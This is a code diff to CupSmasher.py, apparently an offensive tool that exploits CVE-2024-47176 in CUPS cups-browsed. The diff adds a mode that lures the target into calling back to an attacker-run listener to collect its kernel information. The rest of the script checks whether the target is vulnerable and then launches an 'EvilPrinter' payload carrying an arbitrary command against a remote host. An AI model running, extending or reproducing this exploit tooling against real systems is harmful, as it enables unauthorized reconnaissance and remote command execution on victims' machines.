@@ -11,7 +11,7 @@ import sys
 isVulnerable = False
 
 
-def server(host, port, printerName):
+def server(host, port, printerName, kernalOnly):
     print("\033[34m[SERVER]\033[37m Starting")
 
     global isVulnerable
@@ -27,9 +27,14 @@ def server(host, port, printerName):
         client_connection, client_address = server_socket.accept()
 
         request = client_connection.recv(1024).decode()
+        
         if(request != None):
             print("\033[34m[SERVER]\033[37m Request Recieved")
-        isVulnerable = CVE_2024_47176.verify(request, printerName)
+        
+        if(kernalOnly):
+            CVE_2024_47176.snagKernal(request)
+        else:
+            isVulnerable = CVE_2024_47176.verify(request, printerName)
 
 parser = argparse.ArgumentParser(
                     prog='CupSmasher.py',
@@ -49,11 +54,25 @@ parser.add_argument('--info', default = 'Printer', help = 'Set the printer info 
 parser.add_argument('-T', '--timeout', default = 480, help = "The timeout value to wait for a target response during the verification phase | Default:480")
 parser.add_argument('--verifyOnly', default = False, action = 'store_true', help = "Only verify CVE-2024-47176")
 parser.add_argument('--autoCheckOff', default = False, action = 'store_true', help = "Disable vulnerability check stage")
+parser.add_argument('--kernalOnly', default = False, action = 'store_true', help = "Only return the kernal information from the target")
 
 args = parser.parse_args()
-if not args.autoCheckOff:
-    serverThread = threading.Thread(target = server, args = (args.LHOST, args.SVRPORT, args.printer))
-    CVE_2024_47176Thread = threading.Thread(target = CVE_2024_47176.initiate, args = (args.RHOST, args.RPORT, args.LHOST, args.SVRPORT, args.printer))
+
+# Setup Our Threads
+serverThread = threading.Thread(target = server, args = (args.LHOST, args.SVRPORT, args.printer, args.kernalOnly))
+CVE_2024_47176Thread = threading.Thread(target = CVE_2024_47176.initiate, args = (args.RHOST, args.RPORT, args.LHOST, args.SVRPORT, args.printer))
+
+# Gather Target Kernal Information Only
+if(args.kernalOnly):
+    serverThread.start()
+    CVE_2024_47176Thread.start()
+
+    serverThread.join(timeout=int(args.timeout))
+    print("\033[32m[CupSmasher]\033[37m Shutting Down...")
+    sys.exit()
+
+# Autocheck
+if(not args.autoCheckOff):
 
     serverThread.start()
     CVE_2024_47176Thread.start()
@@ -65,5 +84,6 @@ if not args.autoCheckOff:
         print("\033[32m[CupSmasher]\033[37m Shutting Down...")
         sys.exit()
 
-if not args.verifyOnly:
+# Exploit
+if(not args.verifyOnly):
     EvilPrinter.launch(args.RHOST, args.RPORT, args.LHOST, int(args.PRTPORT), args.printer, args.location, args.info, args.command)  
